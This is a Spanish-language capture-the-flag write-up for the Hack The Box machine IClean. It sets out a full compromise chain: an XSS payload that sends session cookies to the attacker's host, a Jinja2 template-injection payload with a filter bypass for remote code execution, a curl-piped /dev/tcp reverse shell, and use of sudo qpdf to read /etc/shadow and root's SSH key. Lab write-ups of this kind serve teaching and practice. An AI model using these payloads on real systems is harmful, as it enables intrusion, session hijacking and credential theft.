# IClean

![Pasted image 20240415122142](https://github.com/JoseVazquez101/Writteups/assets/111292579/6ee3f900-12e0-44ea-a432-e703b28994dd)

***
- Source: https://app.hackthebox.com/machines/IClean
- OS: ``Linux``.
- Dificultad: ``Easy``.
- IP: ``10.10.11.12``.
- Temas: `XSS,` `Cookie Hijacking,`, `SSTI`, `Hash-Cracking`, `Sudoers`.
***
#### Enum:

- Hacemos un escaneo de puertos con `nmap`:

~~~bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 10.10.11.12
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-12 12:16 EDT
NSE: Loaded 46 scripts for scanning.
Initiating SYN Stealth Scan at 12:16
Scanning 10.10.11.12 [65535 ports]
Discovered open port 80/tcp on 10.10.11.12
Discovered open port 22/tcp on 10.10.11.12
Completed SYN Stealth Scan at 12:16, 16.90s elapsed (65535 total ports)
Initiating Service scan at 12:16
Scanning 2 services on 10.10.11.12
Completed Service scan at 12:16, 6.96s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.12.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 2.48s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 2.64s elapsed
Nmap scan report for 10.10.11.12
Host is up, received user-set (0.24s latency).
Scanned at 2024-04-12 12:16:02 EDT for 29s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.31 seconds
           Raw packets sent: 82091 (3.612MB) | Rcvd: 82081 (3.283MB)
~~~

- Añadimos el dominio `capiclean.htb` al `/etc/hosts`:

~~~bash
❯ echo "10.10.11.12     capiclean.htb" >> /etc/hosts
~~~

- Vemos que el sitio web emplea Python:

~~~bash
❯ whatweb http://capiclean.htb -v
WhatWeb report for http://capiclean.htb
Status    : 200 OK
Title     : Capiclean
IP        : 10.10.11.12
Country   : RESERVED, ZZ

Summary   : Bootstrap, Email[contact@capiclean.htb], HTML5, HTTPServer[Werkzeug/2.3.7 Python/3.10.12], JQuery[3.0.0], Python[3.10.12], Script, Werkzeug[2.3.7], X-UA-Compatible[IE=edge]
~~~

- Para el fuzzing de directorios intenté usar `gobuster` pero no me respondía, así que utilicé `ffuf` en su lugar:

~~~bash
❯ ffuf -c -u 'http://capiclean.htb/FUZZ' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 404,401
________________________________________________

 :: Method           : GET
 :: URL              : http://capiclean.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404,401
________________________________________________

#                       [Status: 200, Size: 16697, Words: 4654, Lines: 349, Duration: 691ms]
login                   [Status: 200, Size: 2106, Words: 297, Lines: 88, Duration: 407ms]
services                [Status: 200, Size: 8592, Words: 2325, Lines: 193, Duration: 257ms]
team                    [Status: 200, Size: 8109, Words: 2068, Lines: 183, Duration: 241ms]
quote                   [Status: 200, Size: 2237, Words: 98, Lines: 90, Duration: 229ms]
logout                  [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 223ms]
dashboard               [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 233ms]
choose                  [Status: 200, Size: 6084, Words: 1373, Lines: 154, Duration: 231ms]
~~~

- Revisé todos los recursos y no vi nada interesante, exceptuando `quote`:

![Pasted image 20240412104722](https://github.com/JoseVazquez101/Writteups/assets/111292579/30d299d3-2de4-47ef-98ba-fbdbf23bf8a4)

- Si interceptamos la petición podremos ver que dirige la petición a un recurso `sendMessage` por POST, de la siguiente manera:

~~~python
POST /sendMessage HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-MX,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Origin: http://capiclean.htb
Connection: close
Referer: http://capiclean.htb/quote
Upgrade-Insecure-Requests: 1

service=Carpet+Cleaning&email=test%40test.com
~~~

- Al mandar el request podemos notar que la página nos responde con este mensaje:

~~~
Thank you

Your quote request was sent to our management team. They will reach out soon via email. Thank you for the interest you have shown in our services.
~~~
***

#### Intrusión:

- Se nos dice que el equipo de gestión recibe nuestro mensaje, por lo que podemos probar con una XSS reflejada.
- Intenté utilizar el típico ``alert("XSS")``, pero la página nos bloquea esta petición desde el navegador.
- Vamos a utilizar este payload:

~~~js
<img src=x onerror=this.src="http://10.10.16.50:8081/cookie.php?c="+document.cookie;>
~~~

- Y lo vamos a encodear en URL, la solicitud POST quedaría de la siguiente manera:

~~~python
POST /sendMessage HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-MX,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 285
Origin: http://capiclean.htb
Connection: close
Referer: http://capiclean.htb/quote
Upgrade-Insecure-Requests: 1

service=%3c%69%6d%67%20%73%72%63%3d%78%20%6f%6e%65%72%72%6f%72%3d%74%68%69%73%2e%73%72%63%3d%22%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%36%2e%35%30%3a%38%30%38%31%2f%63%6f%6f%6b%69%65%2e%70%68%70%3f%63%3d%22%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3b%3e&email=test%40test.com
~~~

- En nuestro puerto, deberíamos recibir la cookie de sesión en texto plano:

~~~bash
❯ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.10.11.12 - - [12/Apr/2024 23:25:21] code 404, message File not found
10.10.11.12 - - [12/Apr/2024 23:25:21] "GET /cookie.php?c=session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zhn62Q.tzQGOWjsTz_bvfxovxV_cICTvMU HTTP/1.1" 404 -
~~~

- Añadimos la cookie en el navegador y ahora podremos dirigirnos al apartado de ``dashboad``.
- Dentro de este panel, hay algunas opciones que podemos realizar, dentro de las cuales vemos:
	- `Generar factura`
	- `Generar QR`
	- `Editar servicios`
	- `Solicitudes de cotización`

![Pasted image 20240412220725](https://github.com/JoseVazquez101/Writteups/assets/111292579/3c552fcb-7bb3-4e91-858b-22fff072f8d3)

- Primero entendí un poco que hacía cada apartado, lo más interesante que encontré es que el generador de QR debe recibir el ID de una factura.
- Para esto, podemos generar una en `Generate Invoice`, y tendremos un ID.
- Una vez insertado el ID en el apartado de `Generate QR`, deberíamos ver algo así:

![Pasted image 20240412222657](https://github.com/JoseVazquez101/Writteups/assets/111292579/7430ee2b-4a19-48af-9a34-d86417eb9894)

- Podemos pensar que la página genera por detrás el QR de manera dinámica.
- En palabras más concretas, el servidor usa por detrás una plantilla para renderizar páginas HTML y genera dinámicamente estos enlaces QR.
- Podemos intentar aplicar una SSTI (Server Side Template Injection) muy básica, con el payload más conocido de todos que sería el `{{7*7}}`.
- Lo mandé de la siguiente forma:

~~~js
invoice_id=&form_type=scannable_invoice&qr_link={{7*7}}
~~~

- Y filtré por un número 49 en la respuesta del servidor, lo obtuve en este apartado:

~~~html
</main>
<div class="qr-code-container"><div class="qr-code"><img src="data:image/png;base64,49" alt="QR Code"></div>
</body>
~~~

- Sabemos que se emplea Python en el servidor, así que probaré Payloads de motores de plantillas vinculados a este lenguaje, como pueden ser `jinja2, mako, Django o Tornado`.
- Estuve probando varios payloads hasta que fue uno de `jinja2` el que me dio resultado (`{{config.items()}}`):

![Pasted image 20240412224426](https://github.com/JoseVazquez101/Writteups/assets/111292579/d73be419-a585-4050-8edf-0ff0fa053028)

- A partir de aquí, solo fue buscar uno que propiciara una RCE.
- Probé varios payloads pero ninguno me funcionó, todos me daban el mismo error:

~~~bash
The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.
~~~

- Afortunadamente, HackTricks tiene este articulo donde habla de bypassing para STTI en Jinja2:
	- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti

- Este nos dice que algo que podemos hacer es encodear los caracteres como `"_"` en su valor hexadecimal, que es `0x5F`, que en Python podemos representar como `\x5f`.
- Usaremos este payload para ejecutar el comando ID:

~~~python
{{''.__class__.mro()[1].__subclasses__()[365]('id',shell=True,stdout=-1).communicate()[0].strip()}}
~~~

- Y encodeado en hexadecimal nos quedaría algo así:

~~~python
{{''["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fmro\x5f\x5f"][1]["\x5f\x5fsubclasses\x5f\x5f"]()[365]('id',shell=True,stdout=-1).communicate()[0].strip()}}
~~~

- Y con esto hemos creado una RCE:

![Pasted image 20240412232136](https://github.com/JoseVazquez101/Writteups/assets/111292579/c006b68f-9d07-4306-8890-e7fb3101908e)

- Inventé entablar revshells de muchas formas pero ninguna se ajustaba debido a las comillas, para librarme del encodeado hice lo siguiente.
- Me monté un server en Python con un archivo llamado `rev.sh` como contenido:

~~~bash
❯ cat rev.sh
bash -i >& /dev/tcp/10.10.16.50/4444 0>&1
~~~

- Mi payload fue el siguiente:

~~~bash
{{''["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fmro\x5f\x5f"][1]["\x5f\x5fsubclasses\x5f\x5f"]()[365]('curl http://10.10.16.50/rev.sh|bash',shell=True,stdout=-1).communicate()[0].strip()}}
~~~

- Y me puse en escucha por el puerto 4444, con esto recibí una conexión:

~~~bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.50] from (UNKNOWN) [10.10.11.12] 43142
bash: cannot set terminal process group (1214): Inappropriate ioctl for device
bash: no job control in this shell
www-data@iclean:/opt/app$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@iclean:/opt/app$ 
~~~

- Realicé un tratamiento de TTY y con esto podríamos comenzar con la escalada de privilegios.
- En este caso no lo hice de la manera convencional como suelo hacerlo en otras máquinas, porque me dio errores, así que solo spawneé una bash interactiva con Python

~~~bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
~~~

***

#### PrivEsc:

- De primeras vi que solo existen dos usuarios en el server:

~~~bash
www-data@iclean:/opt/app$ cat /etc/passwd | grep bash
cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
consuela:x:1000:1000:consuela:/home/consuela:/bin/bash
~~~

- En el directorio donde spawneamos, tenemos un archivo `app.py`, que tiene credenciales hardcodeadas xd:

~~~bash
cat app.py
from flask import Flask, render_template, request, jsonify, make_response, session, redirect, url_for
from flask import render_template_string
import pymysql
import hashlib
import os
import random, string
import pyqrcode
from jinja2 import StrictUndefined
from io import BytesIO
import re, requests, base64

app = Flask(__name__)

app.config['SESSION_COOKIE_HTTPONLY'] = False

secret_key = ''.join(random.choice(string.ascii_lowercase) for i in range(64))
app.secret_key = secret_key
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
~~~

- Nos conectamos a la base de datos:

~~~bash
www-data@iclean:/opt/app$ mysql -u iclean -p -h 127.0.0.1 -D capiclean
mysql -u iclean -p -h 127.0.0.1 -D capiclean
Enter password: pxCsmnGLckUb
~~~

- Y ahí está nuestro usuario:

~~~bash
mysql> show tables;
show tables;
+---------------------+
| Tables_in_capiclean |
+---------------------+
| quote_requests      |
| services            |
| users               |
+---------------------+
3 rows in set (0.00 sec)

mysql> select * from users;
select * from users;
+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------------------------------------------------------------+----------------------------------+
2 rows in set (0.00 sec)
~~~

- Intentaré romper los hashes.
- No pude usar hashcat ni john así que utilicé `crackstation`, que me dio estas credenciales:

~~~
consuela:'simple and clean'
~~~

- Ya podemos conectarnos por `ssh`:

~~~bash
❯ ssh consuela@capiclean.htb
The authenticity of host 'capiclean.htb (10.10.11.12)' cant be established.

<---- TRASH ---->

You have mail.
consuela@iclean:~$ 
~~~

- Tenemos un mensaje al loguearnos que dice `You have mail.`.
- Podemos ir a esta ruta para ver el contenido del correo para este usuario:

~~~bash
consuela@iclean:/var/mail$ cat consuela
To: <consuela@capiclean.htb>
Subject: Issues with PDFs
From: management <management@capiclean.htb>
Date: Wed September 6 09:15:33 2023


Hey Consuela,

Have a look over the invoices, I've been receiving some weird PDFs lately.

Regards,
Management
~~~

- También vemos que podemos ejecutar un binario en especifico como `sudo`:

~~~bash
consuela@iclean:~$ sudo -l
[sudo] password for consuela: 
Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
~~~

- Investigué un poco como utilizar esta herramienta y me di cuenta de que podemos insertar un archivo a un PDF.
- Se puede utilizar la bandera `--add-attachment` para incrustar archivos dentro de un PDF.
- En sí, se puede añadir al PDF como un adjunto que luego podría ser extraído utilizando `binwalk`:

~~~bash
consuela@iclean:~$ sudo qpdf --empty --add-attachment /etc/shadow -- out.pdf
consuela@iclean:~$ ls
out.pdf  user.txt
~~~

- Nos pasamos este montando un server de Python:

~~~bash
consuela@iclean:~$ python3 -m http.server 6969
Serving HTTP on 0.0.0.0 port 6969 (http://0.0.0.0:6969/) ...
~~~

- Bajamos el archivo a nuestra máquina:

~~~bash
❯ wget http://capiclean.htb:6969/out.pdf
--2024-04-15 15:55:20--  http://capiclean.htb:6969/out.pdf
Resolviendo capiclean.htb (capiclean.htb)... 10.10.11.12
Conectando con capiclean.htb (capiclean.htb)[10.10.11.12]:6969... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1229 (1.2K) [application/pdf]
Grabando a: «out.pdf»

out.pdf                                        100%[=================================================================================================>]   1.20K  5.64KB/s    en 0.2s    

2024-04-15 15:55:21 (5.64 KB/s) - «out.pdf» guardado [1229/1229]
~~~

- Y con `binwalk` extraemos la información:

~~~bash
❯ binwalk -e out.pdf

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PDF document, version: "1.3"
522           0x20A           Zlib compressed data, default compression
~~~

- Ahora podemos ver el contenido de `/etc/shadow`:

~~~bash
❯ cat _out.pdf.extracted/20A
root:$y$j9T$s0AIwd7onN6K77K5v8DNN/$bSd333U5BKvkfCPEGdf9dLl3bOYwqOlFNtGZ1FQQuv/:19774:0:99999:7:::
daemon:*:19579:0:99999:7:::
bin:*:19579:0:99999:7:::
sys:*:19579:0:99999:7:::
~~~

- Al parecer la contraseña de root no se puede romper.
- Pensé más archivos, y realicé el mismo procedimiento para obtener la llave privada de `ssh` del usuario root.
- Con esto y repitiendo el mismo procedimiento reemplazando el archivo, obtendríamos la llave privada de curva elíptica.
- Nuestro comando quedaría algo así:

~~~bash
consuela@iclean:~$ sudo qpdf --empty --add-attachment /root/.ssh/id_rsa -- id_rsa_pub.pdf
consuela@iclean:~$ ls
id_rsa_pub.pdf  user.txt
~~~

- Pasándolo a nuestra máquina, bastaría extraer este:

~~~bash
❯ cat _id_rsa_pub.pdf.extracted/209

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBN
vX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljir
dJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSm
JV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFAN
EAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4B
AgMEBQ==
-----END OPENSSH PRIVATE KEY-----
~~~

- Y asignarle los permisos necesarios (`209` es el nombre de la llave, solo cámbienlo para que no sea tan confuso xd):

~~~bash
❯ chmod 600 209
~~~

- Y nos conectamos por ssh:

~~~bash
❯ ssh root@capiclean.htb -i 209
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

<------ TRASH ------>

Last login: Mon Apr 15 09:49:22 2024 from 10.10.14.92
root@iclean:~# 
~~~
